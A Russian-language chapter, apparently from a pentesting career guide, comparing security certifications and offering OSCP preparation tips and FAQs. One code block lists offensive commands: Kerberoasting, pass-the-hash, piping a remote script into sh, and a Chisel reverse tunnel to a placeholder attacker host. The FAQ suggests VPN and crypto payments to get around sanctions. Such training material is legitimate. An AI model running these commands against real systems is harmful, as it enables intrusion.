## 16.1.1 Зачем нужны сертификации

Сертификации в кибербезопасности — это не просто «бумажки». Для специалиста, переходящего из PHP-разработки, они решают несколько задач:

```
Проблема кандидата без опыта в ИБ:
┌─────────────────────────────────────────────┐
│  "У меня нет опыта в ИБ, но я хочу         │
│   стать пентестером"                        │
└─────────────┬───────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  Работодатель видит:                        │
│  - Нет коммерческих проектов в ИБ           │
│  - Нет публичных write-ups                  │
│  - Нет рекомендаций из ИБ-компаний          │
└─────────────┬───────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────┐
│  Сертификация решает:                       │
│  ✓ Доказывает базовые знания               │
│  ✓ Структурирует обучение                  │
│  ✓ Даёт «точку входа» в резюме             │
│  ✓ Открывает дверь на собеседование        │
└─────────────────────────────────────────────┘
```

### Что дают сертификации конкретно вам как PHP-разработчику

| Преимущество | Объяснение |
|---|---|
| Credibility | HR-менеджеры понимают eJPT/OSCP, не понимают «я читал книжки» |
| Структура знаний | Программа сертификации покрывает слепые зоны |
| Нетворкинг | Сообщества вокруг сертификаций (Discord OSCP, форумы) |
| Переговорная позиция | С OSCP вы можете требовать на 30-50% больше |
| Работа за рубежом | OSCP котируется в США, Европе, ОАЭ |

**OSCP — что реально нужно знать:**

```bash
# Критически важные навыки для OSCP:

## 1. Buffer Overflow (BOF) — обязательно
# Классический stack-based BOF на Windows
pattern_create -l 2000       # в Metasploit
pattern_offset -q 41336141   # найти offset
# Написать эксплойт на Python

## 2. Active Directory атаки
# Перечисление
python3 bloodhound.py -u user -p pass -d domain.local -dc dc01.domain.local
# Kerberoasting
GetUserSPNs.py domain.local/user:pass -request
# Pass-the-Hash
psexec.py -hashes :NTLMhash domain/admin@target

## 3. Privilege Escalation
# Linux — LinPEAS
curl -L https://github.com/.../linpeas.sh | sh
# Windows — WinPEAS
.\winPEAS.exe quiet cmd fast

## 4. Pivoting
# Через SSH
ssh -D 1080 user@pivot_host
# Через Chisel
./chisel server --reverse --port 8080   # атакующий
./chisel client ATTACK_IP:8080 R:1080:socks  # жертва
```

### Что выбрать первым?

**Сценарий A: Полный новичок в ИБ (ваш случай как PHP-разработчика)**
```
Рекомендация: eJPT → PNPT → OSCP

Причины:
1. eJPT — убедиться что тема интересна, получить "быструю победу"
2. PNPT — закрепить знания реальным экзаменом, написать отчёт
3. OSCP — достичь признанного стандарта через 18-24 месяца
```

**Сценарий B: Уже есть 6+ месяцев практики на HTB/THM**
```
Рекомендация: PNPT → OSCP

Пропустить eJPT как слишком лёгкий
```

**Сценарий C: Хочу устроиться быстро на Junior в РФ**
```
Рекомендация: eJPT (получить) + начать готовиться к PNPT

Российский рынок: eJPT + практика на HTB + портфолио
дают больше, чем Security+ или CEH
```

## 16.1.11 Часто задаваемые вопросы

**Q: Нужен ли OSCP для работы в России?**

A: Формально нет — многие российские компании берут без OSCP. Но:
- OSCP резко выделяет вас среди кандидатов
- Открывает двери в топовые компании (PT, BI.ZONE, Jet)
- Дисциплинирует и структурирует знания
- Критически важен при работе на зарубежных клиентов

**Q: Можно ли сдать OSCP, находясь в России?**

A: Да, с некоторыми нюансами:
- Оплата через VPN (санкции на прямые платежи)
- Оплата криптовалютой — OffSec принимает
- Через посредников (авторизованные учебные центры)
- Технически экзамен доступен из РФ

**Q: Что если провалю OSCP?**

A: Это нормально — многие сдают со 2-3 попытки:
- 2-я попытка: +249 USD
- Анализируйте где не хватило очков
- Продолжайте практику 2-3 месяца
- Многие успешные пентестеры сдали со 2-3 раза

**Q: Стоит ли брать CEH?**

A: Только если работодатель прямо требует. Для реальных навыков — PNPT или OSCP на порядок ценнее. CEH — дорогой MCQ тест.

**Q: Как платить за иностранные сертификации из России?**

A: Варианты:
1. Криптовалюта (Bitcoin, USDT) — принимают многие вендоры
2. Через зарубежную карту (друзья, релоканты)
3. Авторизованные учебные центры в РФ (наценка 20-30%)
4. Виртуальные карты через сервисы-посредники
